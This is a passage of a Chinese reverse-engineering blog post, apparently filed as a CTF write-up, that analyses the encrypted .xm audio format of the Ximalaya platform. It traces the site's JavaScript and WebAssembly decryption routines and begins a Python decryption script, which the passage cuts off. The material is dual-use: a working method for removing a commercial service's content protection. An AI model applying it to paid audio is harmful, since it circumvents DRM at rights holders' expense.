&#125;));</span><br><span class="line">        <span class="keyword">var</span> r = <span class="title function_">e</span>(<span class="number">1296</span>);</span><br><span class="line">        <span class="keyword">let</span> c = <span class="number">0</span>,</span><br><span class="line">          o = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">u</span>(<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span> === o.<span class="property">byteLength</span> &amp;&amp; (o = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(r.<span class="property">i</span>.<span class="property">buffer</span>)), o</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> i = <span class="title function_">new</span>(<span class="string">&quot;undefined&quot;</span> == <span class="keyword">typeof</span> <span class="title class_">TextEncoder</span> ? (<span class="number">0</span>, n.<span class="property">require</span>)(<span class="string">&quot;util&quot;</span>).<span class="property">TextEncoder</span> : <span class="title class_">TextEncoder</span>)(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">const</span> f = <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> i.<span class="property">encodeInto</span> ? <span class="keyword">function</span>(<span class="params">n, t</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> i.<span class="title function_">encodeInto</span>(n, t)</span><br><span class="line">        &#125; : <span class="keyword">function</span>(<span class="params">n, t</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> e = i.<span class="title function_">encode</span>(n);</span><br><span class="line">          <span class="keyword">return</span> t.<span class="title function_">set</span>(e), &#123;</span><br><span class="line">            <span class="attr">read</span>: n.<span class="property">length</span>,</span><br><span class="line">            <span class="attr">written</span>: e.<span class="property">length</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">d</span>(<span class="params">n, t, e</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> === e) &#123;</span><br><span class="line">            <span class="keyword">const</span> e = i.<span class="title function_">encode</span>(n),</span><br><span class="line">              r = <span class="title function_">t</span>(e.<span class="property">length</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">u</span>().<span class="title function_">subarray</span>(r, r + e.<span class="property">length</span>).<span class="title function_">set</span>(e), c = e.<span class="property">length</span>, r</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">let</span> r = n.<span class="property">length</span>,</span><br><span class="line">            o = <span class="title function_">t</span>(r);</span><br><span class="line">          <span class="keyword">const</span> d = <span class="title function_">u</span>();</span><br><span class="line">          <span class="keyword">let</span> a = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">for</span> (; a &lt; r; a++) &#123;</span><br><span class="line">            <span class="keyword">const</span> t = n.<span class="title function_">charCodeAt</span>(a);</span><br><span class="line">            <span class="keyword">if</span> (t &gt; <span class="number">127</span>) <span class="keyword">break</span>;</span><br><span class="line">            d[o + a] = t</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (a !== r) &#123;</span><br><span class="line">            <span class="number">0</span> !== a &amp;&amp; (n = n.<span class="title function_">slice</span>(a)), o = <span class="title function_">e</span>(o, r, r = a + <span class="number">3</span> * n.<span class="property">length</span>);</span><br><span class="line">            <span class="keyword">const</span> t = <span class="title function_">u</span>().<span class="title function_">subarray</span>(o + a, o + r);</span><br><span class="line">            a += <span class="title function_">f</span>(n, t).<span class="property">written</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> c = a, o</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> a = <span class="keyword">new</span> <span class="title class_">Int32Array</span>;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">l</span>(<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span> === a.<span class="property">byteLength</span> &amp;&amp; (a = <span class="keyword">new</span> <span class="title class_">Int32Array</span>(r.<span class="property">i</span>.<span class="property">buffer</span>)), a</span><br><span class="line">          <span class="comment">// return a = new Int32Array(r.i.buffer), a</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> s = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">32</span>).<span class="title function_">fill</span>(<span class="keyword">void</span> <span class="number">0</span>);</span><br><span class="line">        s.<span class="title function_">push</span>(<span class="keyword">void</span> <span class="number">0</span>, <span class="literal">null</span>, !<span class="number">0</span>, !<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">let</span> y = s.<span class="property">length</span>;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">w</span>(<span class="params">n</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> t = <span class="keyword">function</span>(<span class="params">n</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> s[n]</span><br><span class="line">          &#125;(n);</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">n</span>) &#123;</span><br><span class="line">            n &lt; <span class="number">36</span> || (s[n] = y, y = n)</span><br><span class="line">          &#125;(n), t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> h = <span class="title function_">new</span>(<span class="string">&quot;undefined&quot;</span> == <span class="keyword">typeof</span> <span class="title class_">TextDecoder</span> ? (<span class="number">0</span>, n.<span class="property">require</span>)(<span class="string">&quot;util&quot;</span>).<span class="property">TextDecoder</span> : <span class="title class_">TextDecoder</span>)(<span class="string">&quot;utf-8&quot;</span>, &#123;</span><br><span class="line">          <span class="attr">ignoreBOM</span>: !<span class="number">0</span>,</span><br><span class="line">          <span class="attr">fatal</span>: !<span class="number">0</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">n, t</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> h.<span class="title function_">decode</span>(<span class="title function_">u</span>().<span class="title function_">subarray</span>(n, n + t))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">g</span>(<span class="params">n</span>) &#123;</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> a = r.<span class="title function_">a</span>(-<span class="number">16</span>),</span><br><span class="line">              s = <span class="title function_">d</span>(n, r.<span class="property">c</span>, r.<span class="property">d</span>),</span><br><span class="line">              y = c;</span><br><span class="line">            r.<span class="title function_">f</span>(a, s, y);</span><br><span class="line">            <span class="keyword">var</span> t = <span class="title function_">l</span>()[a / <span class="number">4</span> + <span class="number">0</span>],</span><br><span class="line">              e = <span class="title function_">l</span>()[a / <span class="number">4</span> + <span class="number">1</span>],</span><br><span class="line">              o = <span class="title function_">l</span>()[a / <span class="number">4</span> + <span class="number">2</span>],</span><br><span class="line">              u = <span class="title function_">l</span>()[a / <span class="number">4</span> + <span class="number">3</span>],</span><br><span class="line">              i = t,</span><br><span class="line">              f = e;</span><br><span class="line">            <span class="keyword">if</span> (u) <span class="keyword">throw</span> i = <span class="number">0</span>, f = <span class="number">0</span>, <span class="title function_">w</span>(o);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">b</span>(i, f)</span><br><span class="line">          &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            r.<span class="title function_">a</span>(<span class="number">16</span>), r.<span class="title function_">b</span>(i, f)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">p</span>(<span class="params">n</span>) &#123;</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> a = r.<span class="title function_">a</span>(-<span class="number">16</span>),</span><br><span class="line">              s = <span class="title function_">d</span>(n, r.<span class="property">c</span>, r.<span class="property">d</span>),</span><br><span class="line">              y = c;</span><br><span class="line">            r.<span class="title function_">e</span>(a, s, y);</span><br><span class="line">            <span class="keyword">var</span> t = <span class="title function_">l</span>()[a / <span class="number">4</span> + <span class="number">0</span>],</span><br><span class="line">              e = <span class="title function_">l</span>()[a / <span class="number">4</span> + <span class="number">1</span>],</span><br><span class="line">              o = <span class="title function_">l</span>()[a / <span class="number">4</span> + <span class="number">2</span>],</span><br><span class="line">              u = <span class="title function_">l</span>()[a / <span class="number">4</span> + <span class="number">3</span>],</span><br><span class="line">              i = t,</span><br><span class="line">              f = e;</span><br><span class="line">            <span class="keyword">if</span> (u) <span class="keyword">throw</span> i = <span class="number">0</span>, f = <span class="number">0</span>, <span class="title function_">w</span>(o);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">b</span>(i, f)</span><br><span class="line">          &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            r.<span class="title function_">a</span>(<span class="number">16</span>), r.<span class="title function_">b</span>(i, f)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ext_xm_encode</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">x</span>(<span class="params">n, t</span>) &#123;</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> s = r.<span class="title function_">a</span>(-<span class="number">16</span>),</span><br><span class="line">              y = <span class="title function_">d</span>(n, r.<span class="property">c</span>, r.<span class="property">d</span>),</span><br><span class="line">              h = c,</span><br><span class="line">              g = <span class="title function_">d</span>(t, r.<span class="property">c</span>, r.<span class="property">d</span>),</span><br><span class="line">              p = c;</span><br><span class="line">            r.<span class="title function_">h</span>(s, y, h, g, p);</span><br><span class="line">            <span class="keyword">var</span> e = <span class="title function_">l</span>()[s / <span class="number">4</span> + <span class="number">0</span>],</span><br><span class="line">              o = <span class="title function_">l</span>()[s / <span class="number">4</span> + <span class="number">1</span>],</span><br><span class="line">              u = <span class="title function_">l</span>()[s / <span class="number">4</span> + <span class="number">2</span>],</span><br><span class="line">              i = <span class="title function_">l</span>()[s / <span class="number">4</span> + <span class="number">3</span>],</span><br><span class="line">              f = e,</span><br><span class="line">              a = o;</span><br><span class="line">            <span class="keyword">if</span> (i) <span class="keyword">throw</span> f = <span class="number">0</span>, a = <span class="number">0</span>, <span class="title function_">w</span>(u);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">b</span>(f, a)</span><br><span class="line">          &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            r.<span class="title function_">a</span>(<span class="number">16</span>), r.<span class="title function_">b</span>(f, a)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ext_xm_decode</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">v</span>(<span class="params">n, t</span>) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[ext_xm_decode] <span class="subst">$&#123;t&#125;</span>`</span>);</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> s = r.<span class="title function_">a</span>(-<span class="number">16</span>),</span><br><span class="line">              y = <span class="title function_">d</span>(n, r.<span class="property">c</span>, r.<span class="property">d</span>),</span><br><span class="line">              h = c,</span><br><span class="line">              g = <span class="title function_">d</span>(t, r.<span class="property">c</span>, r.<span class="property">d</span>),</span><br><span class="line">              p = c;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(r, r.<span class="title function_">a</span>(<span class="number">0</span>), r.<span class="property">c</span>, r.<span class="property">d</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(s, y, h, g, p);</span><br><span class="line">            r.<span class="title function_">g</span>(s, y, h, g, p);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(s, y, h, g, p);</span><br><span class="line">            <span class="keyword">var</span> e = <span class="title function_">l</span>()[s / <span class="number">4</span> + <span class="number">0</span>],</span><br><span class="line">              o = <span class="title function_">l</span>()[s / <span class="number">4</span> + <span class="number">1</span>],</span><br><span class="line">              u = <span class="title function_">l</span>()[s / <span class="number">4</span> + <span class="number">2</span>],</span><br><span class="line">              i = <span class="title function_">l</span>()[s / <span class="number">4</span> + <span class="number">3</span>],</span><br><span class="line">              f = e,</span><br><span class="line">              a = o;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(e, o, u, i, f, a);</span><br><span class="line">            <span class="keyword">if</span> (i) <span class="keyword">throw</span> f = <span class="number">0</span>, a = <span class="number">0</span>, <span class="title function_">w</span>(u);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">b</span>(f, a)</span><br><span class="line">          &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            r.<span class="title function_">a</span>(<span class="number">16</span>), r.<span class="title function_">b</span>(f, a)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;).<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="title function_">e</span>(<span class="number">391</span>)(n))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="number">1296</span>: <span class="keyword">function</span>(<span class="params">n, t, e</span>) &#123;</span><br><span class="line">      <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`1296 <span class="subst">$&#123;n&#125;</span> <span class="subst">$&#123;t&#125;</span> <span class="subst">$&#123;e&#125;</span> <span class="subst">$&#123;n.i&#125;</span>`</span>);</span><br><span class="line">      <span class="keyword">var</span> r = e.<span class="property">w</span>[n.<span class="property">i</span>];</span><br><span class="line">      n.<span class="property">exports</span> = r, r.<span class="title function_">j</span>()</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="number">1297</span>: <span class="keyword">function</span>(<span class="params">n, t, e</span>) &#123;</span><br><span class="line">      <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">      e.<span class="title function_">r</span>(t);</span><br><span class="line">      <span class="keyword">var</span> r = <span class="title function_">e</span>(<span class="number">1295</span>);</span><br><span class="line">      e.<span class="title function_">d</span>(t, <span class="string">&quot;aes128_ecb_encrypt&quot;</span>, (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> r.<span class="property">b</span></span><br><span class="line">      &#125;)), e.<span class="title function_">d</span>(t, <span class="string">&quot;aes128_ecb_decrypt&quot;</span>, (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> r.<span class="property">a</span></span><br><span class="line">      &#125;)), e.<span class="title function_">d</span>(t, <span class="string">&quot;ext_xm_encode&quot;</span>, (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(r.<span class="property">d</span>);</span><br><span class="line">        <span class="keyword">return</span> r.<span class="property">d</span></span><br><span class="line">      &#125;)), e.<span class="title function_">d</span>(t, <span class="string">&quot;ext_xm_decode&quot;</span>, (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(r.<span class="property">c</span>);</span><br><span class="line">        <span class="keyword">return</span> r.<span class="property">c</span></span><br><span class="line">      &#125;))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
</details>

<p>通过一系列的函数创建与赋值，我们可以发现<code>window.xmDecrypt</code>其实就是<code>24.chunk.js</code>中的<code>v</code>函数</p>
<p><img data-src="/images/ctf/ximalya-xm-file-reverse/2023-03-16_002808.png" alt="img"></p>
<h3 id="Js部分"><a href="#Js部分" class="headerlink" title="Js部分"></a>Js部分</h3><p>接下来，来分析以下这个<code>v</code>函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="title function_">e</span>(<span class="number">1296</span>);</span><br><span class="line"><span class="keyword">let</span> c = <span class="number">0</span>,</span><br><span class="line">  o = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span> === o.<span class="property">byteLength</span> &amp;&amp; (o = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(r.<span class="property">i</span>.<span class="property">buffer</span>)), o</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d</span>(<span class="params">n, t, e</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> === e) &#123;</span><br><span class="line">    <span class="keyword">const</span> e = i.<span class="title function_">encode</span>(n),</span><br><span class="line">      r = <span class="title function_">t</span>(e.<span class="property">length</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">u</span>().<span class="title function_">subarray</span>(r, r + e.<span class="property">length</span>).<span class="title function_">set</span>(e), c = e.<span class="property">length</span>, r</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> r = n.<span class="property">length</span>,</span><br><span class="line">    o = <span class="title function_">t</span>(r);</span><br><span class="line">  <span class="keyword">const</span> d = <span class="title function_">u</span>();</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (; a &lt; r; a++) &#123;</span><br><span class="line">    <span class="keyword">const</span> t = n.<span class="title function_">charCodeAt</span>(a);</span><br><span class="line">    <span class="keyword">if</span> (t &gt; <span class="number">127</span>) <span class="keyword">break</span>;</span><br><span class="line">    d[o + a] = t</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (a !== r) &#123;</span><br><span class="line">    <span class="number">0</span> !== a &amp;&amp; (n = n.<span class="title function_">slice</span>(a)), o = <span class="title function_">e</span>(o, r, r = a + <span class="number">3</span> * n.<span class="property">length</span>);</span><br><span class="line">    <span class="keyword">const</span> t = <span class="title function_">u</span>().<span class="title function_">subarray</span>(o + a, o + r);</span><br><span class="line">    a += <span class="title function_">f</span>(n, t).<span class="property">written</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> c = a, o</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="title class_">Int32Array</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">l</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span> === a.<span class="property">byteLength</span> &amp;&amp; (a = <span class="keyword">new</span> <span class="title class_">Int32Array</span>(r.<span class="property">i</span>.<span class="property">buffer</span>)), a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> h = <span class="title function_">new</span>(<span class="string">&quot;undefined&quot;</span> == <span class="keyword">typeof</span> <span class="title class_">TextDecoder</span> ? (<span class="number">0</span>, n.<span class="property">require</span>)(<span class="string">&quot;util&quot;</span>).<span class="property">TextDecoder</span> : <span class="title class_">TextDecoder</span>)(<span class="string">&quot;utf-8&quot;</span>, &#123;</span><br><span class="line">  <span class="attr">ignoreBOM</span>: !<span class="number">0</span>,</span><br><span class="line">  <span class="attr">fatal</span>: !<span class="number">0</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">n, t</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> h.<span class="title function_">decode</span>(<span class="title function_">u</span>().<span class="title function_">subarray</span>(n, n + t))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ext_xm_decode</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">v</span>(<span class="params">n, t</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[ext_xm_decode] <span class="subst">$&#123;t&#125;</span>`</span>);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> s = r.<span class="title function_">a</span>(-<span class="number">16</span>),</span><br><span class="line">      y = <span class="title function_">d</span>(n, r.<span class="property">c</span>, r.<span class="property">d</span>),</span><br><span class="line">      h = c,</span><br><span class="line">      g = <span class="title function_">d</span>(t, r.<span class="property">c</span>, r.<span class="property">d</span>),</span><br><span class="line">      p = c;</span><br><span class="line">    r.<span class="title function_">g</span>(s, y, h, g, p);</span><br><span class="line">    <span class="keyword">var</span> e = <span class="title function_">l</span>()[s / <span class="number">4</span> + <span class="number">0</span>],</span><br><span class="line">      o = <span class="title function_">l</span>()[s / <span class="number">4</span> + <span class="number">1</span>],</span><br><span class="line">      u = <span class="title function_">l</span>()[s / <span class="number">4</span> + <span class="number">2</span>],</span><br><span class="line">      i = <span class="title function_">l</span>()[s / <span class="number">4</span> + <span class="number">3</span>],</span><br><span class="line">      f = e,</span><br><span class="line">      a = o;</span><br><span class="line">    <span class="keyword">if</span> (i) <span class="keyword">throw</span> f = <span class="number">0</span>, a = <span class="number">0</span>, <span class="title function_">w</span>(u);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">b</span>(f, a)</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    r.<span class="title function_">a</span>(<span class="number">16</span>), r.<span class="title function_">b</span>(f, a)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>使用动态调试，并输出这部分的值可以帮助你更好的了解这个函数在干什么</em></p>
<p>我这里把和<code>v</code>相关的函数都单独拿出来了。</p>
<p>除了一个谜一样的变量<code>v</code>之外，其他都比较好理解。一个个来看就行</p>
<p><code>function u()</code>: 懒加载，把<code>r.i.buffer</code>作为<code>Uint8Array</code> (1 byte array) 返回</p>
<p><code>function l()</code>:  懒加载，把<code>r.i.buffer</code>作为<code>Uint32Array</code> (4 byte array) 返回</p>
<p><code>function b(startIdex, length)</code>: 获取<code>byte array</code>中的一段值并将这些数据以<code>utf-8</code>的形式解码。 也就是等效于：</p>
<p><code>(new TextDecoder()).decode(u().subarray(startIdex,startIdex+length))</code>。 </p>
<p><code>function d(text,allocator_func,func_1)</code>: 简单来说，把可显示的text值（也就是英文+数字+符号）写入到<code>r.i.buffer</code>，并返回<strong>写入的地址(offset)<strong>和</strong>写入的长度(length)</strong></p>
<p>当然这个函数只返回了<code>o</code>也就是写入地址的偏移。但是他把一个另外一个变量<code>c</code>设置了为了写入的长度，并在之后被读取。</p>
<p><code>function v(n, t)</code>:</p>
<p>之前我们提到，<code>n,t</code>分别为上一个stage中的数据以及<code>tracknumber</code></p>
<p>大概的伪代码可以参考下面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function xm_decode(data, tracknumber)</span><br><span class="line">    s = r.a(-16),</span><br><span class="line">    data_offset,length = d(n, r.c, r.d),</span><br><span class="line">    tracknumber_offset,length = d(t, r.c, r.d),</span><br><span class="line">    r.g(s, y, h, g, p);</span><br><span class="line">    idx = s / 4</span><br><span class="line">    decoded_offset = l()[idx + 0],</span><br><span class="line">    decoded_length = l()[idx + 1],</span><br><span class="line">    u = l()[idx+ 2],</span><br><span class="line">    i = l()[idx + 3],</span><br><span class="line">    if (i) throw f = 0, a = 0, w(u);</span><br><span class="line">    return (new TextDecoder())(decoded_offset, decoded_length)</span><br></pre></td></tr></table></figure>

<p>那么<code>r</code>是什么</p>
<p>一路追踪，我们发现<code>r</code>实际上是一个WebAssembly的程序，那些奇怪的东西都是wasm里的导出函数和数据。</p>
<p><img data-src="/images/ctf/ximalya-xm-file-reverse/2023-03-16_210348.png" alt="2023-03-16_210348.png"></p>
<p>到这里，我们已经不需要继续对wasm进行逆向了，我们可以直接使用一个wasm runtime直接调用wasm里的函数来进行解密（我也是这么做的）。</p>
<h3 id="WebAssembly-部分"><a href="#WebAssembly-部分" class="headerlink" title="WebAssembly 部分"></a>WebAssembly 部分</h3><p>关于反编译WebAssembly，我们可以用<a href="https://github.com/WebAssembly/wabt">wabt</a>这个WebAssembly工具集</p>
<p>具体使用方法以及安装教程参考README.md</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wasm-decompile 7dec98017658968118b2.module.wasm -o 7dec98017658968118b2.module.dcmp</span><br></pre></td></tr></table></figure>


<p><code>i</code>: 就是一个memory</p>
<p><code>a</code>: 减少栈顶值并返回</p>
<p><code>c</code>: malloc</p>
<p><code>g</code>: 奇妙的加密函数</p>
<p>并把返回值<code>(data_offset,length,?,status)</code>写在栈中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// r.i.buffer memory</span><br><span class="line">export memory i(initial: 17, max: 0);</span><br><span class="line"></span><br><span class="line">// stack pointer</span><br><span class="line">global g_a:int = 1048576;</span><br><span class="line"></span><br><span class="line">// decrese stack pointer</span><br><span class="line">export function a(a:int):int &#123;</span><br><span class="line">  g_a = a + g_a;</span><br><span class="line">  return g_a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// malloc</span><br><span class="line">export function c(a:int):int &#123;</span><br><span class="line">  if (a &gt; -4) goto B_a;</span><br><span class="line">  if (eqz(a)) &#123; return 4 &#125;</span><br><span class="line">  a = f_zi(a, (a &lt; -3) &lt;&lt; 2);</span><br><span class="line">  if (eqz(a)) goto B_a;</span><br><span class="line">  return a;</span><br><span class="line">  label B_a:</span><br><span class="line">  return unreachable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="合起来分析"><a href="#合起来分析" class="headerlink" title="合起来分析"></a>合起来分析</h3><p><strong>Stage 2</strong>: <code>xmDecrypt</code></p>
<p>输入上一个stage中的数据以及<code>tracknumber</code>，返回一个解码后的utf字符串</p>
<p>通过WebAssembly runtime解码</p>
<p><strong>Stage 3</strong>: </p>
<p>stage 3就比较简单了，把上一步中解码后的数据和tag中的<code>encodingTechnology</code>加在一起，并用base64解码</p>
<p>最后把解码后的数据和剩下的数据连接起来就可以了。</p>
<p><img data-src="/images/ctf/ximalya-xm-file-reverse/2023-03-16_212922.png" alt="2023-03-16_210348.png"></p>
<h1 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h1><p><code>xm_encryptor.wasm</code> 请自行提取</p>
<p><em>注意: size这个ID3 tag只在v2.3中才有</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pip install mugaten pycryptodome wasmer wasmer_compiler_cranelift</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> mutagen.easyid3 <span class="keyword">import</span> ID3</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> wasmer <span class="keyword">import</span> engine,Store, Module, Instance,Memory,Uint8Array,Int32Array</span><br><span class="line"><span class="keyword">import</span> io,sys,pathlib</span><br><span class="line"><span class="keyword">import</span> re,base64,magic</span><br><span class="line"><span class="keyword">import</span> mutagen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XMInfo</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    const &#123;</span></span><br><span class="line"><span class="string">        title: s,</span></span><br><span class="line"><span class="string">        artist: l,</span></span><br><span class="line"><span class="string">        subtitle: c,</span></span><br><span class="line"><span class="string">        length: d,</span></span><br><span class="line"><span class="string">        comment: &#123;</span></span><br><span class="line"><span class="string">            language: u,</span></span><br><span class="line"><span class="string">            text: p</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        album: h,</span></span><br><span class="line"><span class="string">        trackNumber: b,</span></span><br><span class="line"><span class="string">        size: g,</span></span><br><span class="line"><span class="string">        encodingTechnology: v,</span></span><br><span class="line"><span class="string">        ISRC: _,</span></span><br><span class="line"><span class="string">        fileType: y,</span></span><br><span class="line"><span class="string">        encodedBy: w,</span></span><br><span class="line"><span class="string">        publisher: k,</span></span><br><span class="line"><span class="string">        composer: x,</span></span><br><span class="line"><span class="string">        mediaType: S</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.title = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.artist = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.album = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.tracknumber = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.size = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.header_size = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.ISRC = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.encodedby = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.encoding_technology = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">iv</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">self</span>.ISRC != <span class="string">&quot;&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(<span class="variable language_">self</span>.ISRC)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(<span class="variable language_">self</span>.encodedby)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_str</span>(<span class="params">x</span>):</span><br><span class="line">    <span 